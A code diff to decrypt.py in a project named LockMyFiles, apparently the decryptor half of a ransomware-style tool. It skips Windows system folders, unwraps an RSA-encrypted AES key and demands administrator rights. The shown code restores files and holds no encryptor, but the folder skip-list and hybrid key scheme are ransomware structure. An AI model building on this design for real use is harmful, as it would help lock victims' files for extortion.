@@ -1,3 +1,11 @@
+'''
+@Author: 3vil_k4li & Odelesse-Chen
+@Date: 2019-12-25 14:39:38
+@LastEditTime : 2019-12-25 15:20:44
+@LastEditors  : Please set LastEditors
+@Description: decrypt the files
+@FilePath: \LockMyFiles\decrypt.py
+'''
 from __future__ import print_function
 import base64
 import os
@@ -5,8 +13,7 @@ import sys
 import ctypes
 import string
 import multiprocessing
-from time import perf_counter
-
+from time import perf_counter, sleep
 from aes_class import LockPath
 from rsa_class import RSA_Class
 
@@ -36,20 +43,22 @@ def decrypt_sys():
     except FileNotFoundError as e:
         print(e)
         print("press any key to quit")
-        
+        sleep(5)
         sys.exit(0)
 
     WHITE_DIRS = ['RECOVERY', 'DOCUMENTS AND SETTINGS', 'TESTLOCKSYSTEM', 'PROGRAMDATA', 'PROGRAM FILES (X86)', 'WINDOWS', 'PROGRAM FILES', '$WINDOWS.~WS', 'INTEL', 'MOZILLA', 'APPLICATION DATA', 'PERFLOGS', 'TOR BROWSER', '$WINDOWS.~BT', 'GOOGLE', '$RECYCLE.BIN', 'APPDATA', 'MSOCACHE', 'BOOT', 'WINDOWS.OLD', 'SYSTEM VOLUME INFORMATION']
     WHITE_FILES =  ['NTLDR', 'NTUSER.DAT', 'NTUSER.DAT.LOG', 'AUTORUN.INF', 'THUMBS.DB', 'BOOTSECT.BAK', 'BOOTFONT.BIN', 'NTUSER.INI', 'DESKTOP.INI', 'BOOT.INI', 'ICONCACHE.DB']
-
-    password = RSA_Class.load("./password.json")["aes_ciphered_password"]
+    WHITE_DIRS.append(os.path.abspath(os.path.dirname(__file__)).split('\\')[-1].upper())
+    
+    # load and read the RSA encrypted key and decrypt it as the real password, then we use it to decrypt the files!
+    password = RSA_Class.load("./decrypt_key.txt")["aes_ciphered_password"]
     password = password.encode()
     password = base64.b64decode(password)
     password = RSA_Class.decryption(private_key, password)
     password = password.decode()
 
 
-    encrypt_size = 16 * 1024 * 1024
+    encrypt_size = 16 * 1024 * 1024  # every block size is 16 MB 
     decrypt_size = encrypt_size + 32
     keylen = 32
     ivlen = 16
@@ -66,6 +75,7 @@ def is_admin():
     except:
         return False
 
+# check if running as administrator, we need to run as administrator, cause if we don't, some file couldn't be decrypted!
 @timeit
 def main():
     if is_admin():
